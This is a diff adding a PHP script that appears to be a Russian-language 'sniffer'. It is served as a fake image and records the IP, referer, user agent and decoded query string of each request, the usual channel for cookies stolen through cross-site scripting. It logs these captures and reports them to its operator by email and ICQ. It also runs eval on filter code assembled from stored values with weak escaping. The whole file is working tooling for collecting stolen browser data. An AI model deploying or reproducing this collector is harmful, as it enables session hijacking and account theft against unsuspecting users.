@@ -1,0 +1,104 @@
+<?
+define("FILE", "s.gif");
+
+require "config.php";
+require "functions.php";
+
+cleaner();
+
+$sniffed['date'] = date("d.m.Y H:i");
+$sniffed['ip'] = $_SERVER['REMOTE_ADDR'];
+$sniffed['referer'] = htmlspecialchars(stripslashes($_SERVER['HTTP_REFERER']));
+$sniffed['query'] = htmlspecialchars(stripslashes(urldecode($_SERVER['QUERY_STRING'])));
+$sniffed['agent'] = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);
+$sniffed['real_ip'] = htmlspecialchars($_SERVER['HTTP_X_FORWARDED_FOR']);
+
+if (!preg_match("/^https?:\/\//i", $sniffed['referer'])) $sniffed['referer'] = "";
+
+if ($filters_enabled) {
+	$filters = array();
+	$filters_content = get_file_content($filters_filename);
+	if ($filters_content !== NULL) $filters = unserialize($filters_content);
+	$filters_num = count($filters);
+	foreach ($filters as $key => $entrie) {
+		$filter = unserialize($entrie);
+		if ($filter['field'] != "ip" and $filter['field'] != "referer" and $filter['field'] != "query" and $filter['field'] != "agent") break;
+		$filter['value'] = str_replace("\\", "\\\\", str_replace("\"", "\\\"", $filter['value']));
+		switch ($filter['type']) {
+			case "contain": $code = "if (strpos(\$sniffed['".$filter['field']."'], \"".$filter['value']."\") !== false) show_image();"; break;
+			case "uncontain": $code = "if (strpos(\$sniffed['".$filter['field']."'], \"".$filter['value']."\") === false) show_image();"; break;
+			case "equal": $code = "if (\$sniffed['".$filter['field']."'] == \"".$filter['value']."\") show_image();"; break;
+			case "unequal": $code = "if (\$sniffed['".$filter['field']."'] != \"".$filter['value']."\") show_image();"; break;
+		}
+		@eval($code);
+	}
+}
+
+$data = array();
+$data_content = get_file_content($data_filename);
+if ($data_content !== NULL) $data = unserialize($data_content);
+$entrie = serialize($sniffed);
+$data[] = $entrie;
+$data_content = serialize($data);
+put_file_content($data_filename, $data_content);
+
+if ($email_send and checkmail($email_to)) {
+	$date = $sniffed['date'];
+	$ip = $sniffed['ip'];
+	$referer = ($sniffed['referer']) ? html_entity_decode($sniffed['referer']) : "-";
+	$query = ($sniffed['query']) ? html_entity_decode($sniffed['query']) : "-";
+	$agent = ($sniffed['agent']) ? html_entity_decode($sniffed['agent']) : "не определен";
+	preg_match("/^https?:\/\/([^\/]+)/i", $sniffed['referer'], $matches);
+	$host = $matches[1];
+	$what = ($host) ? "запрос с ".$host : "новый запрос";
+	$what_up = ($host) ? "Запрос с ".$host : "Новый запрос";
+	$message =
+		"Сниффером перехвачен $what.\n\n".
+		"Дата и время: $date\n\n".
+		"IP: $ip\n".
+		"REFERER: $referer\n".
+		"QUERY: $query\n".
+		"AGENT: $agent\n\n".
+		"--\n".
+		"См. полный лог: $sniffer_path";
+	@mail($email_to, $what_up, $message, "From: Sniffer Bot <$email_from>\nContent-Type: text/plain; charset=windows-1251");
+}
+
+if ($icq_send and is_uin($icq_uin_send_to)) {
+	require "icqlib.php";
+	$icq = new ICQclient($icq_uin, $icq_password);
+	$icq->connect();
+	if ($icq->connected) {
+		$icq->login();
+		if ($icq->logged) {
+			preg_match("/^https?:\/\/([^\/]+)/i", $sniffed['referer'], $matches);
+			$host = $matches[1];
+			$what = ($host) ? "запрос с ".$host : "новый запрос";
+			if ($icq_notify_type == "full") {
+				$ip = $sniffed['ip'];
+				$referer = ($sniffed['referer']) ? html_entity_decode($sniffed['referer']) : "-";
+				$query = ($sniffed['query']) ? html_entity_decode($sniffed['query']) : "-";
+				$agent = ($sniffed['agent']) ? html_entity_decode($sniffed['agent']) : "не определен";
+				$message =
+					"Сниффером перехвачен $what:\n".
+					"----------------------\n".
+					"IP: $ip\n".
+					"REFERER: $referer\n".
+					"QUERY: $query\n".
+					"AGENT: $agent\n".
+					"----------------------\n".
+					"См. полный лог: $sniffer_path";
+			}
+			elseif ($icq_notify_type == "notify_only") {
+				preg_match("/^https?:\/\/([^\/]+)/i", $sniffed['referer'], $matches);
+				$host = $matches[1];
+				$message = "Сниффером перехвачен $what. См. лог: $sniffer_path";
+			}
+			$icq->send_message($icq_uin_send_to, $message);
+		}
+		$icq->disconnect();
+	}
+}
+
+show_image();
+?>
